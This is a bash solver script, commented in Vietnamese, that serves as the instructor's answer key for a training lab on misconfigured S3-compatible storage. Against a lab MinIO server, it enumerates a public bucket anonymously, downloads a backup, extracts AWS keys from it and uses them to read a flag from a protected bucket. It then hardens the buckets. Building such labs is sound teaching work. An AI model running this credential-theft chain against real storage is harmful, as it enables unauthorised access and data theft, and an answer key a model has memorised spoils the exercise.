#!/bin/bash
#
# solver.sh - cloud-s3-misconfig (LOI GIAI MAU - KHONG phat cho sinh vien)
#
# Muc dich: tu dong thuc hien TOAN BO chuoi khai thac + hardening mo ta trong
# docs/cloud-s3-misconfig-guide.md, de kiem tra instr_config/goals.config PASS
# het khi giai dung (va, chay tren mot may "chua lam gi", se FAIL het).
#
# Chay BEN TRONG container `client` cua bai lab (vd qua terminal cua labtainer,
# hoac `docker exec -it <ten_container_client> bash -lc "bash ~/solver.sh"`
# sau khi container da khoi dong va storage da seed xong MinIO).
#
# Script nay CHI dung de nguoi xay lab tu kiem tra (rebuild -> chay solver.sh ->
# stoplab -> checkwork phai PASS toan bo). KHONG dua file nay vao goi phat hanh
# cho sinh vien.
#
set -euo pipefail

ENDPOINT="http://172.33.0.30:9000"

echo "=================================================================="
echo " [solver] NV1 - enum_anonymous: liet ke an danh + doc bucket policy"
echo "=================================================================="
aws --endpoint-url "$ENDPOINT" s3 ls s3://public-assets --recursive --no-sign-request \
  | tee /tmp/list.out
( grep -q 'backup/app-backup' /tmp/list.out && echo -n LISTED || echo -n NOLIST ) > ~/recon_list_status.txt

# MinIO that KHONG cho doc bucket-policy AN DANH (aws s3api get-bucket-policy ->
# AccessDenied). Day chi la buoc phu; bang chung misconfig THAT = liet ke an danh
# thanh cong o tren. Do do lam buoc nay KHOAN DUNG (khong abort du set -e).
if aws --endpoint-url "$ENDPOINT" s3api get-bucket-policy --bucket public-assets \
     --no-sign-request 2>/dev/null | jq -r '.Policy' > /tmp/policy.json 2>/dev/null; then
  ( grep -q '"Principal"' /tmp/policy.json && grep -qi 'GetObject' /tmp/policy.json \
    && echo -n PUBLICPOLICY || echo -n NOPOLICY ) > ~/recon_policy_status.txt
else
  echo -n "NOPOLICY_anon_denied" > ~/recon_policy_status.txt
fi

echo "recon_list_status   = $(cat ~/recon_list_status.txt)"
echo "recon_policy_status = $(cat ~/recon_policy_status.txt)"

echo "=================================================================="
echo " [solver] NV2 - exfiltrate_backup: tai + giai nen backup, trich credential"
echo "=================================================================="
mkdir -p ~/loot
aws --endpoint-url "$ENDPOINT" s3 cp \
  s3://public-assets/backup/app-backup-20250811.tar.gz ~/loot/ --no-sign-request
tar -xzvf ~/loot/app-backup-20250811.tar.gz -C ~/loot/
cat ~/loot/app-config.env

grep '^AWS_ACCESS_KEY_ID='     ~/loot/app-config.env | cut -d= -f2 | tr -d '\r\n ' > ~/creds_access_key.txt
grep '^AWS_SECRET_ACCESS_KEY=' ~/loot/app-config.env | cut -d= -f2 | tr -d '\r\n ' > ~/creds_secret_key.txt
echo "creds_access_key = $(cat ~/creds_access_key.txt)"
echo "creds_secret_key = $(cat ~/creds_secret_key.txt)"

echo "=================================================================="
echo " [solver] NV3 - access_secure_bucket: xac thuc bang credential lo, lay flag"
echo "=================================================================="
export AWS_ACCESS_KEY_ID
export AWS_SECRET_ACCESS_KEY
AWS_ACCESS_KEY_ID="$(cat ~/creds_access_key.txt)"
AWS_SECRET_ACCESS_KEY="$(cat ~/creds_secret_key.txt)"
export AWS_DEFAULT_REGION=us-east-1

aws --endpoint-url "$ENDPOINT" s3 ls
aws --endpoint-url "$ENDPOINT" s3 ls s3://secure-data --recursive
aws --endpoint-url "$ENDPOINT" s3 cp s3://secure-data/confidential/flag.txt ~/loot.txt
echo "flag (loot.txt) = $(cat ~/loot.txt)"

echo "=================================================================="
echo " [solver] NV4 - harden_storage: go public policy + bat versioning"
echo "=================================================================="
export AWS_ACCESS_KEY_ID
export AWS_SECRET_ACCESS_KEY
AWS_ACCESS_KEY_ID="$(grep '^AWS_ACCESS_KEY_ID=' ~/hardening-admin.env | cut -d= -f2)"
AWS_SECRET_ACCESS_KEY="$(grep '^AWS_SECRET_ACCESS_KEY=' ~/hardening-admin.env | cut -d= -f2)"

aws --endpoint-url "$ENDPOINT" s3api delete-bucket-policy --bucket public-assets
aws --endpoint-url "$ENDPOINT" s3api put-bucket-versioning \
  --bucket secure-data --versioning-configuration Status=Enabled

# 4a. xac minh anonymous list PHAI that bai
unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY
set +e
aws --endpoint-url "$ENDPOINT" s3 ls s3://public-assets --no-sign-request > /tmp/anon.out 2>&1
set -e
( grep -qi AccessDenied /tmp/anon.out && echo -n DENIED || echo -n ALLOWED ) > ~/harden_anon_status.txt
cat /tmp/anon.out || true
echo "harden_anon_status = $(cat ~/harden_anon_status.txt)"

# 4b. xac minh versioning secure-data = Enabled
export AWS_ACCESS_KEY_ID
export AWS_SECRET_ACCESS_KEY
AWS_ACCESS_KEY_ID="$(grep '^AWS_ACCESS_KEY_ID=' ~/hardening-admin.env | cut -d= -f2)"
AWS_SECRET_ACCESS_KEY="$(grep '^AWS_SECRET_ACCESS_KEY=' ~/hardening-admin.env | cut -d= -f2)"
aws --endpoint-url "$ENDPOINT" s3api get-bucket-versioning --bucket secure-data > /tmp/ver.out 2>&1
( grep -q '"Status": "Enabled"' /tmp/ver.out && echo -n ENABLED || echo -n DISABLED ) > ~/harden_versioning_status.txt
cat /tmp/ver.out
echo "harden_versioning_status = $(cat ~/harden_versioning_status.txt)"

echo "=================================================================="
echo " [solver] HOAN TAT. Tom tat cac file bang chung (dung de doi chieu goals.config):"
echo "=================================================================="
for f in recon_list_status.txt recon_policy_status.txt creds_access_key.txt \
         creds_secret_key.txt loot.txt harden_anon_status.txt harden_versioning_status.txt; do
  printf '  ~/%-28s = %s\n' "$f" "$(cat "$HOME/$f" 2>/dev/null)"
done
